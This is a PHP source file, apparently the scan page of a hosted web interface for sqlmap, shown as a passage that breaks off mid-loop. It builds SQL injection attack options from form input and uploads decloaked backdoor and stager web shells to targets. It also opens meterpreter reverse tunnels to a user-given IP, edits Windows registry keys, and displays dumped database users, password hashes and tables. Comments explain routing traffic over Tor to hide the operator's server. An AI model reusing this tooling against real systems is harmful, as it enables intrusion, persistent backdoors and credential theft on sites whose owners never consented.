<?php

  @set_time_limit(0);
  @session_start();
  $sess = session_id();
  if(!$sess) {
    header("Location: /sqlmap/index.php");
  }

  include("./inc/config.php");
  include("./inc/SQLMAPClientAPI.class.php");

  include_once("header.php"); 
  if((isset($_POST['url'])) && (trim($_POST['url']) != "") && (trim($_POST['token']) == $_SESSION['token'])) {
    $options_to_enable = array();
    $options_to_enable['url'] = trim($_POST['url']);
    $host_str = parse_url($options_to_enable['url'], PHP_URL_HOST);
    if((isset($_POST['method'])) && (trim($_POST['method']) != "")) {
      $options_to_enable['method'] = trim($_POST['method']);
    }
    if((isset($_POST['method'])) && (trim($_POST['method']) != "") 
    && ((trim(strtolower($_POST['method'])) == "post") || (trim(strtolower($_POST['method'])) == "put"))) {
      if((isset($_POST['data'])) && (trim($_POST['data']) != "")) {
        $options_to_enable['data'] = trim($_POST['data']); 
      }
    }
    if((isset($_POST['flushSession'])) && (trim(strtolower($_POST['flushSession'])) == "y")) {
      $options_to_enable['flushSession'] = 'true';
    }
    if((isset($_POST['identifier'])) && (trim(strtolower($_POST['identifier'])) == "fuzz")) {
      if((isset($_POST['testParameter'])) && (trim($_POST['testParameter']) != "")) {
        $options_to_enable['testParameter'] = trim($_POST['testParameter']); 
      }
    }
    if((isset($_POST['identifier'])) && (trim(strtolower($_POST['identifier'])) == "forms")) {
      $options_to_enable['forms'] = 'true';
    }
    if((isset($_POST['skip'])) && (trim($_POST['skip']) != "")) {
      $options_to_enable['skip'] = trim($_POST['skip']); 
    }
    if((isset($_POST['delay'])) && ((int) $_POST['delay'] > 0)) {
      $options_to_enable['delay'] = (int) $_POST['delay'];
    }
    if((isset($_POST['timeout'])) && ((int) $_POST['timeout'] > 0) && ((int) $_POST['timeout'] != 30)) {
      $options_to_enable['timeout'] = (int) $_POST['timeout'];
    }
    if((isset($_POST['retries'])) && ((int) $_POST['retries'] > 0) && ((int) $_POST['retries'] != 3)) {
      $options_to_enable['retries'] = (int) $_POST['retries'];
    }
    if((isset($_POST['user_agent_type'])) && (trim($_POST['user_agent_type']) != "")) {
      switch(strtolower(trim($_POST['user_agent_type']))) {
        case "sqlmap":
          break;

        case "mobile":
          $options_to_enable['mobile'] = 'true';
          break;

        case "custom":
          if((isset($_POST['user_agent'])) && (trim($_POST['user_agent']) != "")) {
            $options_to_enable['agent'] = trim($_POST['user_agent']); 
          } else {
            $options_to_enable['randomAgent'] = 'true'; 
          }
          break;

        default:
          $options_to_enable['randomAgent'] = 'true'; 
          break;
      }
    } else {
      $options_to_enable['randomAgent'] = 'true'; 
    }
    if((isset($_POST['host_support'])) && (trim(strtolower($_POST['host_support'])) == "enabled")) {
      if((isset($_POST['host'])) && (trim($_POST['host']) != "")) {
        $options_to_enable['host'] = trim($_POST['host']); 
      }
    }
    if((isset($_POST['cookie_support'])) && (trim(strtolower($_POST['cookie_support'])) == "enabled")) {
      if((isset($_POST['cookie'])) && (trim($_POST['cookie']) != "")) {
        $options_to_enable['cookie'] = trim($_POST['cookie']); 
      }
    }
    if((isset($_POST['referer_support'])) && (trim(strtolower($_POST['referer_support'])) == "enabled")) {
      if((isset($_POST['referer'])) && (trim($_POST['referer']) != "")) {
        $options_to_enable['referer'] = trim($_POST['referer']); 
      }
    }

    if((isset($_POST['header_support'])) && (trim(strtolower($_POST['header_support'])) == "enabled")) {
      if((isset($_POST['headers'])) && (trim($_POST['headers']) != "")) {
        $options_to_enable['headers'] = trim($_POST['headers']); 
      }
    }
    if((isset($_POST['authType'])) && (trim($_POST['authType']) != "")) {
      $options_to_enable['authType'] = trim($_POST['authType']);
      $options_to_enable['authCred'] = trim($_POST['auth_username']) . ':' . trim($_POST['auth_password']);
    }
    if((isset($_POST['request_prefix'])) && (trim(strtolower($_POST['request_prefix'])) == "enabled")) {
      if((isset($_POST['prefix'])) && (trim($_POST['prefix']) != "")) {
        $options_to_enable['prefix'] = trim($_POST['prefix']); 
      }
    }
    if((isset($_POST['request_suffix'])) && (trim(strtolower($_POST['request_suffix'])) == "enabled")) {
      if((isset($_POST['suffix'])) && (trim($_POST['suffix']) != "")) {
        $options_to_enable['suffix'] = trim($_POST['suffix']); 
      }
    }
    if((isset($_POST['request_invalidator'])) && (trim($_POST['request_invalidator']) != "")) {
      switch(trim($_POST['request_invalidator'])) {
        case "invalidBignum":
          $options_to_enable['invalidBignum'] = 'true';
          break;

        case "invalidLogical":
          $options_to_enable['invalidLogical'] = 'true';
          break;

        case "invalidString":
          $options_to_enable['invalidString'] = 'true';
          break;

        default:
          break;
      }
    }
    if((isset($_POST['noCast'])) && (trim($_POST['noCast']) != "")) {
      $options_to_enable['noCast'] = 'true';
    }
    if((isset($_POST['hexConvert'])) && (trim($_POST['hexConvert']) != "")) {
      $options_to_enable['hexConvert'] = 'true';
    }
    if((isset($_POST['hpp'])) && (trim($_POST['hpp']) != "")) {
      $options_to_enable['hpp'] = 'true';
    }
    if((isset($_POST['timeSec'])) && ((int) $_POST['timeSec'] > 0) && ((int) $_POST['timeSec'] != 5)) {
      $options_to_enable['timeSec'] = (int) $_POST['timeSec'];
    }
    if((isset($_POST['union_col_range'])) && (trim(strtolower($_POST['union_col_range'])) == "enabled")) {
      if ((isset($_POST['union_col_min'])) && ((int) $_POST['union_col_min'] > 0) 
      && (isset($_POST['union_col_max'])) && ((int) $_POST['union_col_max'] > 0) 
      && ((int) $_POST['union_col_max'] > (int) $_POST['union_col_min'])) {
        $options_to_enable['uCols'] = $_POST['union_col_min'] . '-' . $_POST['union_col_max'];
      }
    }
    if((isset($_POST['union_char_filter'])) && (trim(strtolower($_POST['union_char_filter'])) == "enabled")) {
      if((isset($_POST['uChar'])) && (trim($_POST['uChar']) != "")) {
        $options_to_enable['uChar'] = trim($_POST['uChar']); 
      }
    }
    if((isset($_POST['union_from_filter'])) && (trim(strtolower($_POST['union_from_filter'])) == "enabled")) {
      if((isset($_POST['uFrom'])) && (trim($_POST['uFrom']) != "")) {
        $options_to_enable['uFrom'] = trim($_POST['uFrom']); 
      }
    }

    if((isset($_POST['tech'])) && (sizeof($_POST['tech']) > 0)) {
      if(in_array("A", $_POST['tech'])) {
        $options_to_enable['tech'] = "BEUSTQ"; 
      } else {
        $options_to_enable['tech'] = strtoupper(implode("", $_POST['tech']));
      }
    } else {
      $options_to_enable['tech'] = "BEUSTQ"; 
    }
    if((isset($_POST['threads'])) && ((int) $_POST['threads'] > 1)) {
      $options_to_enable['threads'] = (int) $_POST['threads'];
    }
    if((isset($_POST['dbms'])) && (trim($_POST['dbms']) != "")) {
      $options_to_enable['dbms'] = trim($_POST['dbms']); 
    }
    if((isset($_POST['os'])) && (trim($_POST['os']) != "")) {
      $options_to_enable['os'] = trim($_POST['os']); 
    }
    if((isset($_POST['tamper'])) && (sizeof($_POST['tamper']) > 0)) {
      $options_to_enable['tamper'] = implode(",", $_POST['tamper']);
    }
    if((isset($_POST['textOnly'])) && (trim(strtolower($_POST['textOnly'])) == "enabled")) {
      $options_to_enable['textOnly'] = 'true';
    }
    if((isset($_POST['titles'])) && (trim(strtolower($_POST['titles'])) == "enabled")) {
      $options_to_enable['titles'] = 'true';
    }
    if((isset($_POST['comaprison_code'])) && (trim(strtolower($_POST['comaprison_code'])) == "enabled")) {
      $options_to_enable['code'] = trim($_POST['request_comaprison_code']); 
    }
    if((isset($_POST['comaprison_str'])) && (trim(strtolower($_POST['comaprison_str'])) == "enabled")) {
      $options_to_enable['string'] = trim($_POST['request_comaprison_str']); 
    }
    if((isset($_POST['comaprison_not_str'])) && (trim(strtolower($_POST['comaprison_not_str'])) == "enabled")) {
      $options_to_enable['notString'] = trim($_POST['request_comaprison_not_str']); 
    }
    if((isset($_POST['comaprison_regexp'])) && (trim(strtolower($_POST['comaprison_regexp'])) == "enabled")) {
      $options_to_enable['regexp'] = trim($_POST['request_comaprison_regex_str']); 
    }
    if((isset($_POST['db'])) && (trim($_POST['db']) != "")) {
      $options_to_enable['db'] = trim($_POST['db']); 
    }
    if((isset($_POST['tbl'])) && (trim($_POST['tbl']) != "")) {
      $options_to_enable['tbl'] = trim($_POST['tbl']); 
    }
    if((isset($_POST['col'])) && (trim($_POST['col']) != "")) {
      $options_to_enable['col'] = trim($_POST['col']); 
    }
    if((isset($_POST['excludeCol'])) && (trim($_POST['excludeCol']) != "")) {
      $options_to_enable['excludeCol'] = trim($_POST['excludeCol']); 
    }
    if((isset($_POST['user'])) && (trim($_POST['user']) != "")) {
      $options_to_enable['user'] = trim($_POST['user']); 
    }
    if((isset($_POST['dumpWhere'])) && (trim($_POST['dumpWhere']) != "")) {
      $options_to_enable['dumpWhere'] = trim($_POST['dumpWhere']); 
    }
    if((isset($_POST['enum_sql_query'])) && (trim($_POST['enum_sql_query']) != "")) {
      $options_to_enable['query'] = trim($_POST['enum_sql_query']); 
    }
    if((isset($_POST['limitStart'])) && (trim($_POST['limitStart']) != "") && ((int) $_POST['limitStart'] >= 0)) {
      $options_to_enable['limitStart'] = trim($_POST['limitStart']); 
    }
    if((isset($_POST['limitStop'])) && (trim($_POST['limitStop']) != "") && ((int) $_POST['limitStop'] > 0)) {
      $options_to_enable['limitStop'] = trim($_POST['limitStop']); 
    }
    if((isset($_POST['enum_options'])) && (sizeof($_POST['enum_options']) > 0)) {
      foreach($_POST['enum_options'] as $opt) {
        if((preg_match("#evalcode|tor|proxy|purgeOutput|saveCmdline#i", $opt))) {
          // evalCode => You can choose to enable this on YOUR server if you like, but opens up RCE vector for user if enabled....
          // tor => Running all requests over tor to keep server hidden, don't want users to disable this to find our host!
          // proxy => Running on server and over tor, we don't need to enable any additional proxying of requests here...
          // purgeOutput => We don't need users deleting shit on us now, schedule regular cleanup via cron or remove everything at end of session...
          continue;
        } else {
          $options_to_enable[$opt] = 'true';
          if($opt == "search") {
            if(isset($options_to_enable['answers'])) {
              $options_to_enable['answers'] .= ",consider=1,dump=n";
            } else {
              $options_to_enable['answers'] = "consider=1,dump=n";
            }
          }
        }
      }
    }
    if((isset($_POST['rFile'])) && (trim($_POST['file_privs']) == "r") && (trim($_POST['rFile']) != "")) {
      $options_to_enable['rFile'] = trim($_POST['rFile']); 
    }
    if((isset($_POST['file_privs'])) && (trim($_POST['file_privs']) == "w") && (trim($_POST['dFile']) != "")) {
      $options_to_enable['dFile'] = trim($_POST['dFile']);
      switch(trim($_POST['file_write'])) {
        case "revShell":
          switch(trim($_POST['cmdShellLang'])) {
            case "1": // ASP
              break;

            case "2": // ASPX
              break;

            case "3": // JSP
              break;

            default:  // PHP
              break;
          }
          break;

        case "uploader":
          switch(trim($_POST['cmdShellLang'])) {
            case "1": // ASP
              copy(SQLMAP_BIN_PATH . "shell/stager.asp_", TMP_PATH . "stager.asp_");
              shell_exec("cd " . TMP_PATH . " && python " . SQLMAP_BIN_PATH . "extra/cloak/cloak.py -d -i " . TMP_PATH . "stager.asp_");
              chmod(TMP_PATH . "stager.asp", 0644);
              $options_to_enable['wFile'] = TMP_PATH . "stager.asp"; 
              break;

            case "2": // ASPX
              copy(SQLMAP_BIN_PATH . "shell/stager.aspx_", TMP_PATH . "stager.aspx_");
              shell_exec("cd " . TMP_PATH . " && python " . SQLMAP_BIN_PATH . "extra/cloak/cloak.py -d -i " . TMP_PATH . "stager.aspx_");
              chmod(TMP_PATH . "stager.aspx", 0644);
              $options_to_enable['wFile'] = TMP_PATH . "stager.aspx"; 
              break;

            case "3": // JSP
              copy(SQLMAP_BIN_PATH . "shell/stager.jsp_", TMP_PATH . "stager.jsp_");
              shell_exec("cd " . TMP_PATH . " && python " . SQLMAP_BIN_PATH . "extra/cloak/cloak.py -d -i " . TMP_PATH . "stager.jsp_");
              chmod(TMP_PATH . "stager.jsp", 0644);
              $options_to_enable['wFile'] = TMP_PATH . "stager.jsp"; 
              break;

            default:  // PHP
              copy(SQLMAP_BIN_PATH . "shell/stager.php_", TMP_PATH . "stager.php_");
              shell_exec("cd " . TMP_PATH . " && python " . SQLMAP_BIN_PATH . "extra/cloak/cloak.py -d -i " . TMP_PATH . "stager.php_");
              chmod(TMP_PATH . "stager.php", 0644);
              $options_to_enable['wFile'] = TMP_PATH . "stager.php"; 
              break;
          }
          break;

        default: // cmdShell
          switch(trim($_POST['cmdShellLang'])) {
            case "1": // ASP
              copy(SQLMAP_BIN_PATH . "shell/backdoor.asp_", TMP_PATH . "backdoor.asp_");
              shell_exec("cd " . TMP_PATH . " && python " . SQLMAP_BIN_PATH . "extra/cloak/cloak.py -d -i " . TMP_PATH . "backdoor.asp_");
              chmod(TMP_PATH . "backdoor.asp", 0644);
              $options_to_enable['wFile'] = TMP_PATH . "backdoor.asp"; 
              break;

            case "2": // ASPX
              copy(SQLMAP_BIN_PATH . "shell/backdoor.aspx_", TMP_PATH . "backdoor.aspx_");
              shell_exec("cd " . TMP_PATH . " && python " . SQLMAP_BIN_PATH . "extra/cloak/cloak.py -d -i " . TMP_PATH . "backdoor.aspx_");
              chmod(TMP_PATH . "backdoor.aspx", 0644);
              $options_to_enable['wFile'] = TMP_PATH . "backdoor.aspx"; 
              break;

            case "3": // JSP
              copy(SQLMAP_BIN_PATH . "shell/backdoor.jsp_", TMP_PATH . "backdoor.jsp_");
              shell_exec("cd " . TMP_PATH . " && python " . SQLMAP_BIN_PATH . "extra/cloak/cloak.py -d -i " . TMP_PATH . "backdoor.jsp_");
              chmod(TMP_PATH . "backdoor.jsp", 0644);
              $options_to_enable['wFile'] = TMP_PATH . "backdoor.jsp"; 
              break;

            default:  // PHP
              copy(SQLMAP_BIN_PATH . "shell/backdoor.php_", TMP_PATH . "backdoor.php_");
              shell_exec("cd " . TMP_PATH . " && python " . SQLMAP_BIN_PATH . "extra/cloak/cloak.py -d -i " . TMP_PATH . "backdoor.php_");
              chmod(TMP_PATH . "backdoor.php", 0644);
              $options_to_enable['wFile'] = TMP_PATH . "backdoor.php"; 
              break;
          }
          break;
      }
    }
    // osCmd
    if((isset($_POST['osCmd'])) && (trim($_POST['os_privs']) == "r") && (trim($_POST['osCmd']) != "")) {
      $options_to_enable['osCmd'] = trim($_POST['osCmd']);
      if((isset($_POST['os_cmd_dFile'])) && (trim($_POST['cmdShellLang']) != "")) {
        if(isset($options_to_enable['answers'])) {
          $options_to_enable['answers'] .= ",language=".$_POST['cmdShellLang'].",writable=2,absolute=".trim($_POST['os_cmd_dFile'])."";
        } else {
          $options_to_enable['answers'] = "language=".$_POST['cmdShellLang'].",writable=2,absolute=".trim($_POST['os_cmd_dFile'])."";
        }
      } 
    }
    // osPwn
    if((isset($_POST['os_privs'])) && (trim($_POST['os_privs']) == "p")) {
      if((isset($_POST['osPwn_tmpPath'])) && (trim($_POST['osPwn_tmpPath']) != "")) {
        $options_to_enable['tmpPath'] = trim($_POST['osPwn_tmpPath']);
      }
      if((isset($_POST['osPwn_ip'])) && (trim($_POST['osPwn_ip']) != "") && (isset($_POST['osPwn_port']))) {
        if(($_POST['osPwn_port'] > 0) && ($_POST['osPwn_port'] < 65535)) {
          $osPwn_port = $_POST['osPwn_port'];
        } else {
          $osPwn_port = '4444';
        }
        $osPwn_ip = trim($_POST['osPwn_ip']);
        if((isset($_POST['meterpreter_type'])) && ($_POST['meterpreter_type'] > 0) && ($_POST['meterpreter_type'] < 5)) {
          $osPwn_type = $_POST['osPwn_port'];
        } else {
          $osPwn_type = '1';
        }
        if(isset($options_to_enable['answers'])) {
          $options_to_enable['answers'] .= ",tunnel=1,connection=$osPwn_type,address=$osPwn_ip,port=$osPwn_port,remove=y";
        } else {
          $options_to_enable['answers'] = "tunnel=1,connection=$osPwn_type,address=$osPwn_ip,port=$osPwn_port,remove=y";
        }
        $options_to_enable['osPwn'] = 'true';
      }
    }

    $options_to_enable['msfPath'] = MSF_PATH;  // MSF Path for osX advanced attacks



    if((isset($_POST['win_reg'])) && (trim($_POST['win_reg']) != "")) {
      if((isset($_POST['regKey'])) && (trim($_POST['regKey']) != "")) {
        $options_to_enable['regKey'] = addslashes(trim($_POST['regKey']));
      }
      if((isset($_POST['regVal'])) && (trim($_POST['regVal']) != "")) {
        $options_to_enable['regVal'] = trim($_POST['regVal']); 
      }
      if((isset($_POST['regType'])) && (trim($_POST['regType']) != "")) {
        $options_to_enable['regType'] = trim($_POST['regType']); 
      }
      if((isset($_POST['regData'])) && (trim($_POST['regData']) != "")) {
        $options_to_enable['regData'] = trim($_POST['regData']); 
      }
      switch(trim(strtoupper($_POST['win_reg']))) {
        case "A":
          $options_to_enable['regAdd'] = 'true';
          break;

        case "D":
          $options_to_enable['regDel'] = 'true';
          break;

        default:
          $options_to_enable['regRead'] = 'true';
          if(isset($options_to_enable['answers'])) {
            $options_to_enable['answers'] .= ",extending=y,vulnerable=N,optimize=Y,ProductName=epicFailure,Visual=Y,debug=Y";
          } else {
            $options_to_enable['answers'] = "extending=y,vulnerable=N,optimize=Y,ProductName=epicFailure,Visual=Y,debug=Y";
          }
          break;
      }
    }

    /* 
      ##########################################################################

       OK we now have all of our configuration options set in variables
       Next we need to spin up a new scan task id, then we can send configuration
       Then we run scan
       Monitor Scan Status until finished
       Scan logs and display in textarea for user viewing
       Make info available for downloading on completion
       Destroy everything on end of session

      ##########################################################################
    */

    // For DEBUGGING:
    // View sqlmap requests in proxy:
    // $options_to_enable['proxy'] = 'http://127.0.0.1:8080';
    // This will allow all DB Error messages in reponses to display in our log view
    // $options_to_enable['parseErrors'] = 'true';

    $sqlmap = new SQLMAPClientAPI();
    $sqlmap->task_id = $sqlmap->generateNewTaskID();
    $scanID = trim($sqlmap->task_id);

    // Check to make sure the API communication is working, otherwise bail
    if((isset($scanID)) && (trim($scanID) != "")) {
      if((isset($_POST['level'])) && ((int) $_POST['level'] > 0) && ((int) $_POST['level'] < 6)) {
        $sqlmap->setOptionValue($scanID, 'level', (int) $_POST['level'], true);
      }
      if((isset($_POST['risk'])) && ((int) $_POST['risk'] > 0) && ((int) $_POST['risk'] < 4)) {
        $sqlmap->setOptionValue($scanID, 'risk', (int) $_POST['risk'], true);
      }
      foreach($options_to_enable as $key => $value) {
        $sqlmap->setOptionValue($scanID, $key, $value);
      }
      $sqlmap->startScan($scanID);                              // Launch Scan
      $status = $sqlmap->checkScanStatus($scanID);              // Check Scan Status
      echo '<br /><br />';
      echo '<div class="scan_info" id="scan_info" align="center" style="width">';  // Info div we can use to fill during scan waiting
      echo 'Running SQLMAP Scan on Target, hang tight....<br /><br /><br />';      // Message
      echo '<div class="loading"></div>';                                          // Our Spinner...
      echo '</div>';
      echo str_repeat(' ', 1024*64);
      flush();
      sleep(1);

      while($status['status'] == "running") {
        $status = $sqlmap->checkScanStatus($scanID);            // Continue Checking Scan Status Till Done or Killed
        if(($status['status'] == "terminated") || ($status['status'] == "not running")) { 
          break;                                                // Break on completion or being killed
        }
      }
      echo '<script language="javascript">document.getElementById("scan_info").innerHTML="";</script>';

      $scanData = $sqlmap->getScanData($scanID);                // Grab Scan Data on Completion
      $logData = $sqlmap->reviewScanLogFull($scanID);           // Get the Full Scan Log to Present in Textarea
?>

      <div class="row">
        <div class="col-md-2"></div>
        <div class="col-md-8">
          <div class="form-group">
            <br /><br />
            <label for="results_textarea">SQLMAP Scan Summary for ScanID: <?php echo $scanID; ?></label>

            <?php
              if(sizeof($scanData['data']) > 0) {                       // Scan Data, present to user as nice as we can :)
                echo '<textarea class="form-control" id="results_summary_data_textarea" rows="20">';
                $displayed=false;
                $dt = new DateTime();
                echo "[" . $dt->format('Y-m-d H:i:s') . "] SQLMAP API Scan Initiated\n";
                $scanResultsStrCopy = "[" . $dt->format('Y-m-d H:i:s') . "] SQLMAP Web Edition\n";
                foreach($scanData['data'] as $dataEntry) {
                  if($dataEntry['status'] == 1) {
                    switch($dataEntry['type']) {
                      case "0":
                        // 0 => Injection Details (Vuln Parameter, Injection Type, Base Payload, etc)
                        if(($dataEntry['status'] == 1) && (sizeof($dataEntry['value']) > 0)) {
                          if(!$displayed) {
                            echo "[*] Target URL: " . htmlentities($options_to_enable['url'], ENT_QUOTES, 'UTF-8') . "\n";
                            $scanResultsStrCopy .= "[*] Target URL: " . $options_to_enable['url'] . "\n";
                            if(isset($options_to_enable['data'])) {
                              echo "[*] Data: " . htmlentities($options_to_enable['data'], ENT_QUOTES, 'UTF-8') . "\n";
                              $scanResultsStrCopy .= "[*] Data: " . $options_to_enable['data'] . "\n";
                            }
                            echo "\n[*] Scan Summary: \n";
                            $scanResultsStrCopy .= "\n[*] Scan Summary: \n";
                          }
                          $displayed=true;
                          if((isset($dataEntry['value'][0]['place'])) && (trim($dataEntry['value'][0]['place']) != "")) {
                            echo "   [*] Injection Place: " . htmlentities(trim($dataEntry['value'][0]['place']), ENT_QUOTES, 'UTF-8') . "\n";
                            $scanResultsStrCopy .= "   [*] Injection Place: " . trim($dataEntry['value'][0]['place']) . "\n";
                          }
                          if((isset($dataEntry['value'][0]['parameter'])) && (trim($dataEntry['value'][0]['parameter']) != "")) {
                            echo "   [*] Vuln Parameter: " . htmlentities(trim($dataEntry['value'][0]['parameter']), ENT_QUOTES, 'UTF-8') . "\n";
                            $scanResultsStrCopy .= "   [*] Vuln Parameter: " . trim($dataEntry['value'][0]['parameter']) . "\n";
                          }
                          if((isset($dataEntry['value'][0]['prefix'])) && (trim($dataEntry['value'][0]['prefix']) != "")) {
                            echo "   [*] Injection Prefix: " . htmlentities(trim($dataEntry['value'][0]['prefix']), ENT_QUOTES, 'UTF-8') . "\n";
                            $scanResultsStrCopy .= "   [*] Injection Prefix: " . trim($dataEntry['value'][0]['prefix']) . "\n";
                          }
                          if((isset($dataEntry['value'][0]['suffix'])) && (trim($dataEntry['value'][0]['suffix']) != "")) {
                            echo "   [*] Injection Suffix: " . htmlentities(trim($dataEntry['value'][0]['suffix']), ENT_QUOTES, 'UTF-8') . "\n";
                            $scanResultsStrCopy .= "   [*] Injection Suffix: " . trim($dataEntry['value'][0]['suffix']) . "\n";
                          }
                          if((isset($dataEntry['value'][0]['os'])) && (trim($dataEntry['value'][0]['os']) != "")) {
                            echo "   [*] OS: " . htmlentities(trim($dataEntry['value'][0]['os']), ENT_QUOTES, 'UTF-8') . "\n";
                            $scanResultsStrCopy .= "   [*] OS: " . trim($dataEntry['value'][0]['os']) . "\n";
                          }
                          if((isset($dataEntry['value'][0]['dbms'])) && (trim($dataEntry['value'][0]['dbms']) != "")) {
                            echo "   [*] DBMS: " . htmlentities(trim($dataEntry['value'][0]['dbms']), ENT_QUOTES, 'UTF-8') . "\n";
                            $scanResultsStrCopy .= "   [*] DBMS: " . trim($dataEntry['value'][0]['dbms']) . "\n";
                          }
                          if((isset($dataEntry['value'][0]['dbms_version'])) && (trim($dataEntry['value'][0]['dbms_version']) != "")) {
                            echo "   [*] DBMS Version: " . htmlentities(trim($dataEntry['value'][0]['dbms_version']), ENT_QUOTES, 'UTF-8') . "\n";
                            $scanResultsStrCopy .= "   [*] DBMS Version: " . trim($dataEntry['value'][0]['dbms_version']) . "\n";
                          }
                          if(sizeof($dataEntry['value'][0]['data']) > 0) {
                            echo "   [*] SQL Injection Technique(s): \n";
                            $scanResultsStrCopy .= "   [*] SQL Injection Technique(s): \n";
                            foreach($dataEntry['value'][0]['data'] as $entry) {
                              if((isset($entry['title'])) && (trim($entry['title']) != "")) {
                                echo "      [+] " . htmlentities(trim($entry['title']), ENT_QUOTES, 'UTF-8') . "\n";
                                if(!preg_match("#UNION#i", $entry['title'])) {
                                  echo "      [+] Payload Vector: " . htmlentities(trim($entry['vector']), ENT_QUOTES, 'UTF-8') . "\n";
                                  $scanResultsStrCopy .= "      [+] Payload Vector: " . trim($entry['vector']) . "\n";
                                }
                                echo "      [+] Payload Example: " . htmlentities(trim($entry['payload']), ENT_QUOTES, 'UTF-8') . "\n";
                                $scanResultsStrCopy .= "      [+] Payload Example: " . trim($entry['payload']) . "\n";
                              }
                            }
                          }
                          echo "\n";
                          $scanResultsStrCopy .= "\n";
                        }
                        break;

                      case "1":
                        // Exhaustive DBMS Fingerprinting
                        if($dataEntry['status'] == 1) {
                          echo "[*] DBMS Extensive Fingerprint:\n   [*] " . htmlentities($dataEntry['value'], ENT_QUOTES, 'UTF-8') . "\n";
                          $scanResultsStrCopy .= "[*] DBMS Extensive Fingerprint:\n   [*] " . $dataEntry['value'] . "\n";
                        }
                        break;

                      case "2":
                        // Banner or Version Info
                        if($dataEntry['status'] == 1) {
                          echo "[*] Database Banner: " . htmlentities($dataEntry['value'], ENT_QUOTES, 'UTF-8') . "\n";
                          $scanResultsStrCopy .= "[*] Database Banner: " . $dataEntry['value'] . "\n";
                        }
                        break;

                      case "3":
                        // Current DB User
                        if($dataEntry['status'] == 1) {
                          echo "[*] Current DB User: " . htmlentities($dataEntry['value'], ENT_QUOTES, 'UTF-8') . "\n";
                          $scanResultsStrCopy .= "[*] Current DB User: " . $dataEntry['value'] . "\n";
                        }
                        break;

                      case "4":
                        // Current DB
                        if($dataEntry['status'] == 1) {
                          echo "[*] Current DB: " . htmlentities($dataEntry['value'], ENT_QUOTES, 'UTF-8') . "\n";
                          $scanResultsStrCopy .= "[*] Current DB: " . $dataEntry['value'] . "\n";
                        }
                        break;

                      case "5":
                        // Hostname
                        if($dataEntry['status'] == 1) {
                          echo "[*] Hostname: " . htmlentities($dataEntry['value'], ENT_QUOTES, 'UTF-8') . "\n";
                          $scanResultsStrCopy .= "[*] Hostname: " . $dataEntry['value'] . "\n";
                        }
                        break;

                      case "6":
                        // Is Current User DBA - Boolean
                        if($dataEntry['value'] == 1) {
                          echo "[*] Is DBA: TRUE\n";
                          $scanResultsStrCopy .= "[*] Is DBA: TRUE\n";
                        } else {
                          echo "[*] Is DBA: FALSE\n";
                          $scanResultsStrCopy .= "[*] Is DBA: FALSE\n";
                        }
                        break;

                      case "7":
                        // All DB Users
                        if(sizeof($dataEntry['value']) > 0) {
                          echo "[*] Database User Accounts: \n";
                          $scanResultsStrCopy .= "[*] Database User Accounts: \n";
                          foreach($dataEntry['value'] as $usr) {
                            echo "   [+] " . htmlentities($usr, ENT_QUOTES, 'UTF-8') . "\n";
                            $scanResultsStrCopy .= "   [+] " . $usr . "\n";
                          }
                        }
                        break;

                      case "8":
                        // All DB User Passwords
                        if(sizeof($dataEntry['value']) > 0) {
                          echo "[*] DB User Passwords: \n";
                          $scanResultsStrCopy .= "[*] DB User Passwords: \n";
                          foreach($dataEntry['value'] as $usr => $passwd) {
                            echo "   [*] DB User: " . htmlentities($usr, ENT_QUOTES, 'UTF-8') . "\n";
                            $scanResultsStrCopy .= "   [*] DB User: " . $usr . "\n";
                            foreach($passwd as $pass) {
                              echo "      [+] " . htmlentities($pass, ENT_QUOTES, 'UTF-8') . "\n";
                              $scanResultsStrCopy .= "      [+] " . $pass . "\n";
                            }
                          }
                        }
                        break;

                      case "9":
                        // DB User Privileges
                        if(sizeof($dataEntry['value']) > 0) {
                          echo "[*] DB User Privileges: \n";
                          $scanResultsStrCopy .= "[*] DB User Privileges: \n";
                          foreach($dataEntry['value'] as $usr => $privs) {
                            echo "   [*] DB User: " . htmlentities($usr, ENT_QUOTES, 'UTF-8') . "\n";
                            $scanResultsStrCopy .= "   [*] DB User: " . $usr . "\n";
                            echo "      [*] Privileges: \n";
                            $scanResultsStrCopy .= "      [*] Privileges: \n";
                            foreach($privs as $priv) {
                              echo "         [+] " . htmlentities($priv, ENT_QUOTES, 'UTF-8') . "\n";
                              $scanResultsStrCopy .= "         [+] " . $priv . "\n";
                            }
                          }
                        }
                        break;

                      case "10":
                        // DB User Roles
                        if(sizeof($dataEntry['value']) > 0) {
                          echo "[*] DB User Roles: \n";
                          $scanResultsStrCopy .= "[*] DB User Roles: \n";
                          foreach($dataEntry['value'] as $usr => $roles) {
                            echo "   [*] DB User: " . htmlentities($usr, ENT_QUOTES, 'UTF-8') . "\n";
                            $scanResultsStrCopy .= "   [*] DB User: " . $usr . "\n";
                            echo "      [*] Roles: \n";
                            $scanResultsStrCopy .= "      [*] Roles: \n";
                            foreach($roles as $role) {
                              echo "         [+] " . htmlentities($role, ENT_QUOTES, 'UTF-8') . "\n";
                              $scanResultsStrCopy .= "         [+] " . $role . "\n";
                            }
                          }
                        }
                        break;

                      case "11":
                        // Available Databases
                        if(sizeof($dataEntry['value']) > 0) {
                          echo "[*] Available Database(s): \n";
                          $scanResultsStrCopy .= "[*] Available Database(s): \n";
                          foreach($dataEntry['value'] as $avlbldb) {
                            echo "   [+] " . htmlentities($avlbldb, ENT_QUOTES, 'UTF-8') . "\n";
                            $scanResultsStrCopy .= "   [+] " . $avlbldb . "\n";
                          }
                        }
                        break;

                      case "12":
                        // Tables by Database
                        if(sizeof($dataEntry['value']) > 0) {
                          if((isset($options_to_enable['search'])) && (isset($options_to_enable['tbl']))) {
                            echo "[*] Table Search Term: " . htmlentities($options_to_enable['tbl'], ENT_QUOTES, 'UTF-8') . " \n";
                            $scanResultsStrCopy .= "   [*] Table Search Term: " . $options_to_enable['tbl'] . " \n";
                          } else {
                            echo "\n[*] Table Dump: \n";
                            echo "[*] Tables by Database: \n";
                            $scanResultsStrCopy .= "\n[*] Table Dump: \n[*] Tables by Database: \n";
                          }
                          foreach($dataEntry['value'] as $dbName => $tbls) {
                            if(is_assoc($tbls)) {  // Search by Table Name
                              echo "   [*] DB Table Found In: " . htmlentities($dbName, ENT_QUOTES, 'UTF-8') . " \n";
                              echo "   [*] Table(s): \n";
                              $scanResultsStrCopy .= "   [*] DB Table Found In: " . $dbName . " \n";
                              $scanResultsStrCopy .= "   [*] Table(s): \n";
                              foreach($tbls as $tbl) {
                                echo "         [+] " . htmlentities($tbl, ENT_QUOTES, 'UTF-8') . "\n";
                                $scanResultsStrCopy .= "         [+] " . $tbl . "\n";
                              }
                            } else {               // Normal Column Data Dump
